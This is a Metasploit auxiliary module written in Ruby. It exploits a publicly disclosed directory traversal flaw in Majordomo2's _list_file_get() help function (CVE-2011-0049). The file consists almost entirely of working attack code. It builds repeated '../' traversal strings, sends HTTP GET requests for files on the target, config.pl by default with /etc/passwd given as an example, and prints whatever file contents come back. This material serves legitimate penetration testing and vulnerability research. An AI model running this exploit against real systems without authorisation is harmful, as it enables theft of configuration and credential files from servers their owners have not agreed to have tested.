##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'Majordomo2 _list_file_get() Directory Traversal',
			'Version'        => '$Revision: 10821 $',
			'Description'    => %q{
					This module exploits a directory traversal vulnerability present in
				the _list_file_get() function of Majordomo2 (help function). By default, this 
				module will attempt to download the Majordomo config.pl file.
			},
			'Author'         =>
				['Nikolas Sotiriu http://www.sotiriu.de'],
			'References'     =>
				[
					['OSVDB', '70762'],
					['CVE', '2011-0049'],
					['CVE', '2011-0063'],
					['URL', 'https://sitewat.ch/en/Advisory/View/1'],
					['URL', 'http://sotiriu.de/adv/NSOADV-2011-003.txt'],
					['URL', 'http://www.exploit-db.com/exploits/16103/']
				],
			'DisclosureDate' => 'Mar 08 2011',
			'License'        =>  MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('FILE', [ true,  "Define the remote file to view, ex:/etc/passwd", 'config.pl']),
				OptString.new('URI', [true, 'Majordomo vulnerable URI path', '/cgi-bin/mj_wwwusr/domain=domain?user=&passw=&func=help&extra=']),
				OptInt.new('DEEP', [true, 'Define the max deep of traversals', '8']),
			], self.class)
	end

	def target_url
		"http://#{vhost}:#{rport}#{datastore['URI']}"
	end

	def run_host(ip)
		travString = [
			'../',
			'./.../'
		]
		uri = datastore['URI']
		file = datastore['FILE']
		deep = datastore['DEEP']
		file = file.gsub(/^\//, "")

		travString.each do |tStr|

			i = 1
			while (i <= deep)
				str = "#{str}#{tStr}"
				payload = "#{str}#{file}"

				res = send_request_raw(
					{
						'method'  => 'GET',
						'uri'     => uri + payload,
					}, 25)

				print_status("Majordomo2 - Checking " + payload )

				if (res and res.code == 200 and res.body)
					if res.body.match(/\<html\>(.*)\<\/html\>/im)
						html = $1

						if res.body =~ /unknowntopic/
							print_error("Majordomo2 - Not found ...")
						else
							file_data = html.gsub(%r{(.*)<pre>|<\/pre>(.*)}m, '')
							print_good("Majordomo2 - Vulnerable")
							print_good("Majordomo2 - File Output:\n" + file_data + "\n")
							return :abort
						end
					else
						print_error("Majordomo2 - No HTML was returned")
					end
				else
					print_error("Majordomo2 - Unrecognized #{res.code} response")
				end
				i += 1;
			end
		end

		print_error("Majordomo2 - Not vulnerable or you didn't look DEEP enough!")
	rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
	rescue ::Timeout::Error, ::Errno::EPIPE
	end

end
